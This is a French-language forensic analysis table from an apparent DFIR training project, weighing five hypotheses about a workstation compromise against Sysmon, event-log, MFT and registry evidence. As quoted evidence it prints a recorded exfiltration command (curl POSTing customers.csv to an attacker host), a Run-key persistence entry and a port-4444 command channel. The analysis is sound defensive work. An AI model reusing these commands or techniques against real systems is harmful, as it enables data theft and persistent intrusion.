# Hypothèses endpoint — Projet 4 (DFIR), Analyste A (Oussama)

**Statut :** finalisées après exécution S2 (2026-10-11).
**Fenêtre d'attaque :** 2026-10-07 ~13:14 → 15:30 UTC.
**Évidence consultée :** `~/dfir-s1/evidence/` (sur ANALYST01).

---

| # | Hypothèse | Verdict | Artefact(s) à l'appui |
|---|-----------|---------|------------------------|
| **H1** | Accès initial via exécution d'un fichier par l'utilisateur (exécution manuelle plutôt que vulnérabilité distante) | **CONFIRMÉE** | • Sysmon event 1 @15:01:32 UTC : `invoice_october.exe` PID 3568, parent `powershell.exe` PID 5668, IntegrityLevel High, SHA256 `5EB50394034D6A28DBAAF84CAF6C9D9A96A9FB2B23D3A00CCF246E9D5EE864A2`<br>• Security event 4688 @15:01:53 UTC : même binaire, même parent<br>• Prefetch `INVOICE_OCTOBER.EXE-45D1FC4B.pf` @15:01:40 (preuve d'exécution effective, pas seulement de dépôt)<br>• Hash binaire identique disque (`/mnt/wkstn01/Users/WKSTN01/Downloads/invoice_october.exe`) et coffre (`08-malware/invoice_october.exe`)<br>**Nuance :** parent `powershell.exe` (`Start-Process`), pas `explorer.exe` — ce n'est pas un double-clic Explorer mais une exécution via PowerShell. |
| **H2** | Persistance via une clé Run du registre (HKCU, plutôt qu'une tâche planifiée ou un service) | **CONFIRMÉE (écriture) — persistance non armée sur l'état disque final** | • Sysmon event 13 @15:05:09 UTC : écriture `HKU\S-1-5-21-2904912346-1412300821-689064062-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe` par PID 3568<br>• Sysmon event 11 @15:08:33 UTC : création de `C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe` par PID 3568<br>**Divergence à documenter honnêtement :** `hivexsh` sur `NTUSER.DAT` monté en RO montre uniquement `OneDrive` dans la clé Run (pas de `WindowsUpdate`) ; `find` ne trouve pas `sysupdate.exe` sur disque ; mtime `NTUSER.DAT` = 12:55:22 (pré-attaque). Interprétation : hive non flushé sur disque avant un suspend ultérieur, OU profil nettoyé entre les sessions du 10-10. L'instrumentation (Sysmon) prouve que la persistance a été écrite ; l'état disque final montre qu'elle n'est pas armée. Les deux faits coexistent. |
| **H3** | Accès aux identifiants via lecture mémoire de LSASS (signature mimikatz plutôt que dump SAM hors-ligne) | **NON CONCLUANTE — canal muet, réserve méthodologique** | • Sysmon event 10 = 0 occurrences sur 13 115 events au total — inhabituel sur une config SwiftOnSecurity standard<br>• La capture mémoire du coffre (`04-memory/WKSTN01-3f1f74a8.vmem`) ne couvre PAS la fenêtre d'attaque (voir `semaine-2.md` §1.5 : `.vmem` provient d'un suspend du 10-10, pas du 07-10). Impossible d'analyser `pslist`, `malfind`, injection LSASS à l'instant de l'attaque.<br>• Le fichier `sysmonconfig-export.xml` effectivement chargé sur WKSTN01 n'est pas dans le coffre (`08-malware/` ne contient que le binaire malveillant) — impossible de prouver que la config active logguait bien Event 10 vers `lsass.exe`.<br>**Libellé épistémiquement correct :** on peut dire « l'instrumentation disponible n'a pas enregistré l'événement », on ne peut pas dire « il n'y a pas eu d'accès LSASS ». |
| **H4** | Canal de commande-et-contrôle persistant sur un port non-standard (pas 80/443) | **CONFIRMÉE côté hôte — port 4444/TCP vers 192.168.100.30 — validation PCAP pendante (S3)** | • Sysmon event 3 @15:01:30 UTC : `invoice_october.exe` PID 3568 → `192.168.100.30:4444` TCP, Initiated=True<br>• Sysmon event 3 @15:21:21 UTC : même tuple (seconde connexion, canal persistant)<br>**Portée côté hôte uniquement.** La confirmation définitive du canal (direction, protocole applicatif, durée totale, re-connexions éventuelles) appartient au PCAP d'Amir. En S3, croiser avec `01-pcap/wk0.pcap`. |
| **H5** | Exfiltration de données depuis le profil utilisateur, pas depuis un partage réseau (cohérent avec un accès limité à un seul poste) | **CONFIRMÉE** | • MFT : `C:\Users\WKSTN01\Documents\customers.csv` créé 2026-10-07 15:05:54, taille 133 octets<br>• Security event 4688 @15:05:55 UTC : `curl.exe -X POST --data-binary "@customers.csv" -H "Content-Type: application/octet-stream" http://192.168.100.30:8000/exfil/customers`, parent `cmd.exe`<br>• Security event 4688 @15:09:53 UTC : seconde occurrence (retry ou double-exfil)<br>• `03-timeline/attack.log` : POST reçu côté serveur, 133 octets, cohérent avec taille fichier<br>**Chaîne complète :** fichier (MFT) → commande (4688) → réception (attack.log). |

---

**Résumé synthétique :**
- 3 hypothèses confirmées (H1, H4, H5) — avec H4 en « côté hôte, PCAP pendant »
- 1 hypothèse à verdict nuancé (H2 : écriture confirmée, armement non)
- 1 hypothèse non concluante (H3) — instrumentation insuffisante, pas une infirmation

**Dépendances S3/S4 :**
- H4 : clôture définitive après analyse PCAP par Amir (S3)
- H2 : si le PCAP ou les artefacts malware d'Amir montrent une seconde connexion depuis `sysupdate.exe`, il faudra réévaluer (actuellement non armée côté hôte)
- H3 : si Amir trouve dans le binaire malveillant un payload type mimikatz embarqué, H3 bascule vers « confirmée (par analyse malware) » malgré l'absence Sysmon
